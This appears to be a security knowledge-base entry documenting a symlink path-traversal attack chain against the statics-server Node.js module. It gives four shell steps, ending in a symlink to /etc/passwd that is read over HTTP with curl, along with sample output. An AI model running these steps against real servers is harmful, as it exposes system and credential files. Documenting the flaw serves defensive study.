---
id: ac-uuid-001
tags:
  - path-traversal
  - symlink
  - node-js
  - file-read
  - arbitrary-read
type: attack_chain
tools:
  - '[[tools/npm]]'
  - '[[tools/statics-server]]'
  - '[[tools/ln]]'
  - '[[tools/curl]]'
tactics:
  - '[[Discovery]]'
  - '[[Collection]]'
verified: false
platforms:
  - Linux
  - Node.js
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Install-Statics-Server-Globally]]'
  - '[[procedures/Run-Statics-Server-in-Directory]]'
  - '[[procedures/Create-Symlink-to-Sensitive-File]]'
  - '[[procedures/Access-Symlink-via-HTTP-Request]]'
step_count: 4
techniques:
  - '[[File and Directory Discovery]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:26:17.395Z'
description: >-
  A multi-stage attack exploiting a path traversal vulnerability in the
  statics-server Node.js module (v0.0.9) to read arbitrary files on the server
  using symbolic links.
validated: true
mitre_tactics:
  - '[[Discovery]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[File and Directory Discovery]]'
  - '[[Exploit Public-Facing Application]]'
---
# Arbitrary File Read via Symlink Path Traversal in Statics-Server Node.js Module

Multi-stage attack chain demonstrating exploitation of a path traversal vulnerability in the statics-server Node.js module to achieve arbitrary file reads on the server.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Install Vulnerable Module] --> B[Start Server]
    B --> C[Create Symlink]
    C --> D[Exploit via HTTP]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/npm]]
- [[tools/statics-server]]
- [[tools/ln]]
- [[tools/curl]]

### Target Environment

- Linux OS
- Node.js runtime
- Port 8080 available

### Initial Access Requirements

- Local access to the target server or container
- Ability to install global npm packages
- Permissions to create files/symlinks in the working directory

## Detailed Attack Procedures

### Step 1: Install Vulnerable Module
procedure: [[procedures/Install-Statics-Server-Globally]]

**Objective**: Install the vulnerable statics-server module globally to enable server execution.

**Instructions**: Use [[commands/npm-install-statics-server-global]] to install the module:

```bash
npm install statics-server -g
```

**Expected Output**: Installation logs confirming successful global installation of statics-server v0.0.9.

**Success Indicators**:
- 'statics-server' command available in PATH
- No errors in npm output

### Step 2: Start Vulnerable Server
procedure: [[procedures/Run-Statics-Server-in-Directory]]

**Objective**: Launch the static file server in a controlled directory to serve files on localhost:8080.

**Instructions**: Navigate to the target directory and execute [[commands/statics-server-start]]:

```bash
statics-server
```

**Expected Output**: Server startup message: '服务器已经启动 访问localhost:8080'.

**Success Indicators**:
- Server listening on port 8080
- No startup errors

### Step 3: Create Symlink to Sensitive File
procedure: [[procedures/Create-Symlink-to-Sensitive-File]]

**Objective**: Place a symbolic link to a sensitive file (e.g., /etc/passwd) inside the served directory.

**Instructions**: In the server directory, run [[commands/ln-create-symlink-passwd]]:

```bash
ln -s /etc/passwd passwdsym
```

**Expected Output**: No output; symlink 'passwdsym' created.

**Success Indicators**:
- Symlink exists and points to /etc/passwd (verify with 'ls -l')
- Server continues running

### Step 4: Exploit via HTTP Request
procedure: [[procedures/Access-Symlink-via-HTTP-Request]]

**Objective**: Request the symlink path to read the contents of the targeted sensitive file.

**Instructions**: Use [[commands/curl-access-symlink]] to fetch the file:

```bash
curl localhost:8080/passwdsym
```

**Expected Output**: Contents of /etc/passwd, e.g., 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin...'

**Success Indicators**:
- Arbitrary file contents retrieved
- No 404 or access denied errors

## Attack Chain Summary

### Key Achievements

1. Global installation of vulnerable module
2. Successful server startup exposing directory
3. Symlink creation bypassing path restrictions
4. Arbitrary file read confirming exploitation

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[File and Directory Discovery]] File and Directory Discovery
- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### MITRE ATT&CK Tactics

- [[Discovery]] Discovery
- [[Collection]] Collection

---
*Last updated: 2023-10-01T00:00:00Z*
